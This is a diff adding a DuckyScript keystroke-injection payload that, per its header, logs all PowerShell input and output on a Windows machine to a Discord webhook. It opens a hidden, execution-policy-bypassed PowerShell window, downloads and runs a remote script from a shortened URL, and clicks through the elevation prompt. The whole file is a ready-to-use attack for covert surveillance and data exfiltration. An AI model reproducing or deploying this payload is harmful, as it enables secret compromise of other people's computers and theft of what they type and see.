@@ -1,0 +1,15 @@
+REM Title: Global PS Trascription to Discord
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Log all powershell input and output to a discord webhook
+REM Target: Windows 10, 11
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -W H -Ep Bypass -C $dc = 'YOUR_WEBHOOK_HERE'; irm https://is.gd/bwpstrtodc | iex
+CTRL-SHIFT ENTER
+DELAY 2500
+ALT y
